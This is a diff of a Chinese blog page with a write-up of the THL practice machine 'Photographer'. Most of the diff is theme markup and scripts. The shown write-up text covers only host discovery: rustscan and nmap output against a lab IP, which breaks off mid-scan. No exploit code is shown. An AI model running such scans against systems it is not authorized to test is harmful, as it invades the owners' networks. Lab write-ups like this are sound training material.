@@ -1,26 +1,11 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="K1r1t5u6u"><meta name="copyright" content="K1r1t5u6u"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>THL靶机--Photographer | K1r1t5u6uのHexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.5.3/dist/earth/earth-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
-  [".post-card",".markdown-body img"].forEach((target)=> {
-    ScrollReveal().reveal(target);
-  })
-}
-document.addEventListener("DOMContentLoaded", initScrollReveal);
-document.addEventListener("pjax:success", initScrollReveal);
-</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
-    window.Yun = {}
-    window.CONFIG = {"hostname":"web218.github.io","root":"/","title":"逆水行舟不进则退","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
-  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="一.主机发现和信息收集123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657rustscan -a 10.10.139.236 -- -sV">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THL靶机--Photographer | K1r1t5u6uのHexo</title><meta name="author" content="K1r1t5u6u"><meta name="copyright" content="K1r1t5u6u"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一.主机发现和信息收集123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657rustscan -a 10.10.139.236 -- -sV">
 <meta property="og:type" content="article">
 <meta property="og:title" content="THL靶机--Photographer">
 <meta property="og:url" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/index.html">
 <meta property="og:site_name" content="K1r1t5u6uのHexo">
 <meta property="og:description" content="一.主机发现和信息收集123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657rustscan -a 10.10.139.236 -- -sV">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image.png">
-<meta property="og:image" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_1.png">
-<meta property="og:image" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_2.png">
-<meta property="og:image" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_3.png">
-<meta property="og:image" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_4.png">
-<meta property="og:image" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_5.png">
+<meta property="og:image" content="https://web218.github.io/images/wgqs.jpg">
 <meta property="article:published_time" content="2026-06-29T02:00:29.838Z">
 <meta property="article:modified_time" content="2026-07-05T09:31:22.140Z">
 <meta property="article:author" content="K1r1t5u6u">
@@ -28,24 +13,220 @@ document.addEventListener("pjax:success", initScrollReveal);
 <meta property="article:tag" content="THL">
 <meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image.png"><script>(function() {
-  if (CONFIG.mode !== 'auto') return
-  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
-  const setting = localStorage.getItem('darken-mode') || 'auto'
-  if (setting === 'dark' || (prefersDark && setting !== 'light'))
-    document.documentElement.classList.toggle('dark', true)
-})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
-IconifyProviders = {
-  // Empty prefix: overwrite default API provider configuration
-  '': {
-    // Use custom API first, use Iconify public API as backup
-    resources: [
-        'https://api.iconify.design',
-    ],
-    // Wait for 1 second before switching API hosts
-    rotate: 1000,
+<meta name="twitter:image" content="https://web218.github.io/images/wgqs.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "THL靶机--Photographer",
+  "url": "https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/",
+  "image": "https://web218.github.io/images/wgqs.jpg",
+  "datePublished": "2026-06-29T02:00:29.838Z",
+  "dateModified": "2026-07-05T09:31:22.140Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "K1r1t5u6u",
+      "url": "https://web218.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/1.png"><link rel="canonical" href="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const start = 6
+              const end = 18
+              const isNight =
+                start < end
+                    ? hour < start || hour >= end
+                    : hour >= start || hour < end
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
   },
-};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="#" title="K1r1t5u6u"><img width="96" loading="lazy" src="/images/wgqs.jpg" alt="K1r1t5u6u"></a><div class="site-author-name"><a href="#">K1r1t5u6u</a></div><span class="site-name">K1r1t5u6uのHexo</span><sub class="site-subtitle">逆水行舟</sub><div class="site-description">不进则退</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">15</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.jiongciyuan1.cc/" title="番剧网站" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/web218" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://mail.163.com" title="网易邮箱" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/3537106320230948" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/q/3nByicuAkg" title="QQ" target="_blank" style="color:#87CEEB"><span class="icon iconify" data-icon="ri:qq-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一.主机发现和信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-GET-Shell"><span class="toc-number">2.</span> <span class="toc-text">二.GET Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">三.权限提升:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">攻击原理</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="K1r1t5u6u"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="K1r1t5u6uのHexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">THL靶机--Photographer</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2026-06-29 10:00:29" itemprop="dateCreated datePublished" datetime="2026-06-29T10:00:29+08:00">2026-06-29</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2026-07-05 17:31:22" itemprop="dateModified" datetime="2026-07-05T17:31:22+08:00">2026-07-05</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">靶机系列</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E6%B8%97%E9%80%8F/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">渗透</span></a><a class="tag-item" href="/tags/THL/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">THL</span></a><a class="tag-item" href="/tags/%E6%8F%90%E6%9D%83/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">提权</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="一-主机发现和信息收集"><a href="#一-主机发现和信息收集" class="headerlink" title="一.主机发现和信息收集"></a>一.主机发现和信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.139.236 -- -sV                                                                                                             ─╯</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="line">The Modern Day Port Scanner.</span><br><span class="line">________________________________________</span><br><span class="line">: https://discord.gg/GFrQsGy           :</span><br><span class="line">: https://github.com/RustScan/RustScan :</span><br><span class="line"> --------------------------------------</span><br><span class="line">🌍HACK THE PLANET🌍</span><br><span class="line"></span><br><span class="line">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="line">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="line">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="line">Open 10.10.139.236:22</span><br><span class="line">Open 10.10.139.236:80</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line"><span class="meta prompt_">[&gt;</span><span class="language-bash">] Script to be run Some(<span class="string">&quot;nmap -vvv -p &#123;&#123;port&#125;&#125; &#123;&#123;ip&#125;&#125;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 01:33 EST</span><br><span class="line">NSE: Loaded 47 scripts for scanning.</span><br><span class="line">Initiating ARP Ping Scan at 01:33</span><br><span class="line">Scanning 10.10.139.236 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 01:33, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 01:33</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 01:33, 0.01s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br><span class="line">Initiating SYN Stealth Scan at 01:33</span><br><span class="line">Scanning 10.10.139.236 [2 ports]</span><br><span class="line">Discovered open port 80/tcp on 10.10.139.236</span><br><span class="line">Discovered open port 22/tcp on 10.10.139.236</span><br><span class="line">Completed SYN Stealth Scan at 01:33, 0.02s elapsed (2 total ports)</span><br><span class="line">Initiating Service scan at 01:33</span><br><span class="line">Scanning 2 services on 10.10.139.236</span><br><span class="line">Completed Service scan at 01:33, 7.61s elapsed (2 services on 1 host)</span><br><span class="line">NSE: Script scanning 10.10.139.236.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 01:33</span><br><span class="line">Completed NSE at 01:33, 0.01s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 01:33</span><br><span class="line">Completed NSE at 01:33, 0.01s elapsed</span><br><span class="line">Nmap scan report for 10.10.139.236</span><br><span class="line">Host is up, received arp-response (0.00059s latency).</span><br><span class="line">Scanned at 2026-01-29 01:33:25 EST for 8s</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)</span><br><span class="line">80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.65 ((Debian))</span><br><span class="line">MAC Address: 08:00:27:1A:71:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</span><br><span class="line">           Raw packets sent: 3 (116B) | Rcvd: 4 (160B)</span><br></pre></td></tr></table></figure>
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THL靶机--Photographer',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/images/1.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/wgqs.jpg" onerror="this.onerror=null;this.src='/images/1.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">K1r1t5u6uのHexo</span></a><a class="nav-page-title" href="/"><span class="site-name">THL靶机--Photographer</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">THL靶机--Photographer</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-29T02:00:29.838Z" title="发表于 2026-06-29 10:00:29">2026-06-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-05T09:31:22.140Z" title="更新于 2026-07-05 17:31:22">2026-07-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/">靶机系列</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="一-主机发现和信息收集"><a href="#一-主机发现和信息收集" class="headerlink" title="一.主机发现和信息收集"></a>一.主机发现和信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.139.236 -- -sV                                                                                                             ─╯</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="line">The Modern Day Port Scanner.</span><br><span class="line">________________________________________</span><br><span class="line">: https://discord.gg/GFrQsGy           :</span><br><span class="line">: https://github.com/RustScan/RustScan :</span><br><span class="line"> --------------------------------------</span><br><span class="line">🌍HACK THE PLANET🌍</span><br><span class="line"></span><br><span class="line">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="line">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="line">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="line">Open 10.10.139.236:22</span><br><span class="line">Open 10.10.139.236:80</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line"><span class="meta prompt_">[&gt;</span><span class="language-bash">] Script to be run Some(<span class="string">&quot;nmap -vvv -p &#123;&#123;port&#125;&#125; &#123;&#123;ip&#125;&#125;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">[~] Starting 